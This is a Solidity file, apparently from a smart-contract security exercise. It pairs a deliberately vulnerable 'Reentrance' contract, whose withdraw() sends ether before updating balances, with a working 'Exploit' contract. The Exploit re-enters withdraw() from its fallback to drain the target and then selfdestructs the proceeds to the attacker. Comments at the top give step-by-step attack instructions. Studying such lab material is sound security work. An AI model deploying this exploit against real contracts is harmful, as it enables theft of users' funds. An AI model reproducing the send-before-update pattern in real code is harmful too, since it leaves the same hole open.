// How to test this:

// 1. Deploy Reentrance contract. Take note of the address.
// 2. With the same account, call donate() and send 1 ether.
// 3. With a second account, deploy Exploit contract and pass Reentrance address.
// 4. Call attack(), sending 0.1 ether.
// 5. Call ethBalance() to check Reentrance ether balance, should be 0. 
// 6. Call ethBalance() to check Exploit balance, should be 1 ether
// 7. Call kill() to selfdestruct Exploit and get the 1 ether forwarded to attacker account.

// adapted 

pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public constant returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) { 
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
  
  function() payable {}
}

contract Exploit {
    address target;
    address owner;
   
    Reentrance c;
   
    function Exploit(address _target) {
        target = _target;
        owner = msg.sender;
        c = Reentrance(target);
       
    }
    
    function attack() public payable {
        c.donate.value(0.1 ether)(this);
        c.withdraw(0.1 ether);
    }
   
    function() payable {
        c.withdraw(0.1 ether);
    }
    
    function ethBalance(address _c) public view returns(uint) {
      return _c.balance;
    }
    
    function kill () {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
   
}